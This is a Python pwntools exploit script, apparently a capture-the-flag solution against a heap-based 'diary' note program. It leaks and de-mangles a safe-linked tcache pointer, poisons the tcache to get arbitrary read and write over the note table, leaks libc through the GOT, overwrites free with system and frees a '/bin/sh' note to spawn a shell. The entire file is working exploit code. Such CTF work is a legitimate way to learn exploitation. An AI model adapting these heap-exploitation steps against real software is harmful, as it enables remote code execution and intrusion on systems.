#!/usr/bin/env python3
# Solved by ripSquid


from pwn import *
context.terminal = ['tmux', 'split-window', '-h']
context.gdb_binary = 'pwndbg'

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path])
    else:
        r = remote("127.0.0.1", 50000)

    return r


def unprotect(p):
    plain = 0
    key = 0
    for i in range(6):
        bits = 64-12*(i+1);
        if (bits < 0):
            bits = 0
        plain = ((p ^ key) >> bits) << bits;
        key = plain >> 12;
    return plain



def main():
    r = conn()

    def write_note(num, data):
        r.recvuntil(b"pick a vibe:")
        r.sendline(b"1")
        r.recvuntil(b"page number:")
        r.sendline(f"{num}".encode())
        r.recvuntil(b"how many letters?")
        r.sendline(f"{len(data)}".encode())
        r.recvuntil(b"spill the tea:")
        if isinstance(data, bytes):
            r.sendline(data)
        else:
            r.sendline(data.encode())

    def free_note(num):
        r.recvuntil(b"pick a vibe:")
        r.sendline(b"2")
        r.recvuntil(b"page number:")
        r.sendline(f"{num}".encode())

    def read_note(num):
        r.recvuntil(b"pick a vibe:")
        r.sendline(b"3")
        r.recvuntil(b"page number:")
        r.sendline(f"{num}".encode())
        r.recvuntil(b"dear diary...\n")
        return r.recvline()[:-1]

    def edit_note(num, data):
        r.recvuntil(b"pick a vibe:")
        r.sendline(b"4")
        r.recvuntil(b"page number:")
        r.sendline(f"{num}".encode())
        r.recvuntil(b"rewrite the tea:")
        if isinstance(data, bytes):
            r.sendline(data)
        else:
            r.sendline(data.encode())

    write_note(1, "abcdabcd")
    write_note(2, "abcdabcd")
    write_note(3, "abcdabcd")
    free_note(1)
    free_note(2)
    free_note(3)

    p = u64(read_note(3).ljust(8, b"\00"))
    print(hex(p))
    p = unprotect(p)
    print(hex(p))
    
    write_note(3, "B"*8)
    addr_to_malloc = 0x4040a0 # The address to the note_entries list (should allow us arbitrary rw)

    edit_note(2, p64(addr_to_malloc ^ (p >> 12)))
    write_note(0, "A" * 24)
    write_note(5, p64(0x4040a0))
    write_note(1, "A" * 24)

    n = read_note(0)[0:8]

    payload = n + p64(0x4040e0) + p64(0)

    # Sets note 1 to point to sizes of note 0,1,2.
    edit_note(0, payload)

    # Should now be able to use note 2 as arbitrary read and write

    def read(addr, nb):
        note_0_payload = n + p64(0x4040e0) + p64(addr)
        note_1_payload = p64(24) + p64(24) + p64(nb)
        edit_note(0, note_0_payload)
        edit_note(1, note_1_payload)
        return read_note(2)
    
    def write(addr, data):
        note_0_payload = n + p64(0x4040e0) + p64(addr)
        note_1_payload = p64(24) + p64(24) + p64(len(data))
        edit_note(0, note_0_payload)
        edit_note(1, note_1_payload)
        edit_note(2, data)

    libc_puts_addr = u64(read(0x404008, 8))
    libc_base = libc_puts_addr - 0x805a0

    system = p64(libc_base + 0x53110)

    # Overwrite got for free to point to system, allowing us to free a note with "/bin/sh\00"
    write(0x404008-8, system)

    edit_note(3, "/bin/sh\00")
    free_note(3)

    print(hex(libc_base))


    r.interactive()


if __name__ == "__main__":
    main()
